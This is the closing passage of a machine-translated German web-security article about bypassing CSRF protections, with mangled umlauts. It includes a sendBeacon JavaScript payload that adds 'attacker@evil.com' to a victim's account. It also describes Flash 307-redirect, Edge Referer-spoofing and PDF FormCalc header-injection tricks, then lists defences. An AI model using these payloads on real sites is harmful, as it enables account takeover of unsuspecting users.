class="hljs-function"><span class="hljs-title">jsonreq</span></span></span></span><span class="hljs-params"><span class="actionscript"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span></span><span class="actionscript">{ </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> data = </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'{"action":"add-user-email","Email":"attacker@evil.com"}'</span></span></span><span class="actionscript">; </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> blob = </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">new</span></span></span><span class="actionscript"> Blob([data], {type : </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'application/json;charset=utf-8'</span></span></span><span class="actionscript">}); navigator.sendBeacon(</span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'https://example.com/home/rpc'</span></span></span><span class="actionscript">, blob ); } jsonreq(); </span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Wir erstellen einen neuen Blob mit dem gew√ºnschten Inhaltstyp und senden ihn einfach mit Navigator.sendBeacon (). <br><br>  Ein weiteres Problemumgehungsszenario, das weiterhin funktioniert und in Browsern unterst√ºtzt wird, ist die Umgehung mithilfe des Flash-Plugins. <br><img src="https://habrastorage.org/webt/uv/dy/1x/uvdy1xpch21cebolskgfj6kk53q.jpeg"><br><br>  Selbst wenn es eine Website <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">thehackerblog.com</a> gibt, auf der bereits ein Flash-Laufwerk bereitsteht, geben Sie einfach die URL, den Header, den gew√ºnschten Inhaltstyp und die Daten an, die Sie √ºbertragen m√ºssen - Sie senden, und eine POST-Anfrage mit dem gew√ºnschten Inhaltstyp wird in das Backend gesendet. <br><br>  Es gibt jedoch einen Trick: Sie k√∂nnen nicht nur die URL der Website angeben, die wir angreifen.  Sie m√ºssen die Ressource angeben, <strong>die</strong> <strong>mit dem Code 307</strong> f√ºr die Ressource, die wir angreifen, <strong>umgeleitet wird</strong> .  Dann wird es funktionieren. <br><br>  <strong>8. Spoof Referer</strong> <br><br>  Die letzte Option zum Umgehen des CSRF-Schutzes basiert auf Referer.  Es gibt einen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Fehler im Microsoft Edge-</a> Browser, der immer noch nicht behoben ist und es Ihnen erm√∂glicht, den Wert von Referer zu f√§lschen.  Aber es funktioniert leider nur f√ºr GET-Anfragen.  Wenn das angegriffene Backend GET nicht von POST unterscheidet, kann dieser Fehler ausgenutzt werden. <br><br>  Wenn wir noch POST brauchen, gibt es einen kleinen Trick.  Wir k√∂nnen den Header-Referer mit dem PDF-Plugin und FormCalc senden. <br><img src="https://habrastorage.org/webt/yu/iu/vw/yuiuvwwn-xj4llbso7bhkscb7nc.jpeg"><br><br>  Vor ungef√§hr einem Jahr war es m√∂glich, mit dem PDF-Plug-In generell alle Header zu senden, einschlie√ülich Host, aber dann schloss Adobe diese M√∂glichkeit, indem es eine schwarze Liste von Headern erstellte.  Das hei√üt, wenn wir Referer in der Kopfzeile angeben, wird diese Kopfzeile einfach nicht gel√∂scht. <br><br>  Im Allgemeinen k√∂nnen wir mit FormCalc jeden Inhaltstyp legal einreichen.  Wenn wir Carridge Return- und Zeilenvorschubzeichen einf√ºgen, k√∂nnen wir der Anforderung zus√§tzliche √úberschriften hinzuf√ºgen. <br><br>  Was passiert, wenn wir den Header <code>Referer http://example.com</code> implementieren? <br><br>  Es ist klar, dass es nicht in der schwarzen Liste steht und ein Header mit dem Namen <code>Referer http://example.com</code> an das Backend gesendet wird. <br><br>  Einige Server, wie WildFly oder Jboss, behandeln den <strong>Speicherplatz</strong> als das Ende des Namens des HTTP-Headers, dh des Doppelpunkts ` <strong>:</strong> `.  Daher sehen solche Server, dass Referer mit dem Wert <code>http://example.com</code> zu ihnen gekommen ist.  Also werden wir Referer ersetzen. <br><img src="https://habrastorage.org/webt/mb/7x/gu/mb7xgu42xmzrfmrgiane0pb_zck.jpeg"><br><br>  Dies ist die √úbersichtstabelle.  Die Spalten bieten Schutz vor CSRF und die Zeilen bieten Problemumgehungen.  In jeder Zelle werden die Browser angegeben, in denen diese Methode funktioniert: <br><br><ul><li>  Alle Mittel f√ºr alle Browser; <br></li><li>  Alle * bedeutet Browser, die SameSite-Cookies nicht unterst√ºtzen, d. H.  Alles au√üer Chrome und Opera. <br></li></ul><br><img src="https://habrastorage.org/webt/e7/pg/-v/e7pg-vuidm5muwr1cifi0hthawu.jpeg"><br><br>  Die wichtigste und funktionierendste Option zum Schutz vor CSRF-Angriffen besteht darin, Cookies zu entfernen und Header mit Token zu verwenden. <br><br>  Wenn Sie jedoch immer noch nicht bereit sind, Cookies aufzugeben, um Ihre Benutzersitzung zu verwalten: <br><br><ul><li>  Modellieren Sie Bedrohungen und √ºberpr√ºfen Sie die Implementierung des CSRF-Schutzes <strong><em>(siehe √úbersichtstabelle).</em></strong> <br></li><li>  Implementieren Sie SameSite-Cookies.  Jetzt unterst√ºtzen nur zwei Browser, aber in Zukunft wird es wahrscheinlich mehr geben. <br></li><li>  Kombinieren Sie verschiedene CSRF-Verteidigungen - Tiefenverteidigung. <br></li><li>  Bitten Sie den Benutzer um ein Kennwort, um wichtige Aktionen auszuf√ºhren. <br></li><li>  Geben Sie Dateien an, die vom Benutzer von einer separaten Domain heruntergeladen wurden. <br></li></ul><br><blockquote>  In weniger als sechs Monaten und die n√§chste Hochlast in einem Monat - <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Hochlast ++ Sibirien</a> . <br><br>  Wir m√∂chten Ihre Aufmerksamkeit auf einige der ausgew√§hlten Berichte lenken: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Ich weine um alle!</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Wie wir Zahlungssysteme integriert haben, ohne unsere eigene Abrechnung zu verwenden</a> / Anton Rusakov. <br></li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">njs - native Javascript-Skripterstellung in nginx</a> / Dmitry Volintsev. <br></li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">PG Saga: abh√§ngige Daten√§nderungen in mehreren Diensten ohne zweiphasige</a> Festschreibungen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">und synchrone Abh√§ngigkeiten</a> / Konstantin Evteev. <br></li></ul><br></blockquote></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de412855/">https://habr.com/ru/post/de412855/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de412845/index.html">Klassifizierung von Emotionen: im Zentrum des emotionalen Computing</a></li>
<li><a href="../de412847/index.html">graphql - Optimierung von Datenbankabfragen</a></li>
<li><a href="../de412849/index.html">TOP 8 B√ºcher, die es wert sind, diesen Sommer gelesen zu werden</a></li>
<li><a href="../de412851/index.html">OutOfMemory und GDI + manchmal √ºberhaupt nicht OutOfMemory</a></li>
<li><a href="../de412853/index.html">Video von Badoo Techleads Meetup Nr. 3: Informationen zu Delegations-, Onboarding-, Gesch√§fts- und IT-Interviews</a></li>
<li><a href="../de412859/index.html">Zwei-Faktor-Authentifizierung unter Windows und Datenverschl√ºsselung ohne Zertifizierungsstelle und Dom√§ne</a></li>
<li><a href="../de412861/index.html">Erstellen einer Benutzerpfadzuordnung f√ºr Dummies</a></li>
<li><a href="../de412863/index.html">Dialogflower - Google Dialogflow f√ºr Yandex Alice</a></li>
<li><a href="../de412865/index.html">So schie√üen Sie eine Motion Eye-Kamera im Sony Xperia XZ2</a></li>
<li><a href="../de412867/index.html">Kompilieren der DOS-COM-Datei mit dem GCC-Compiler</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>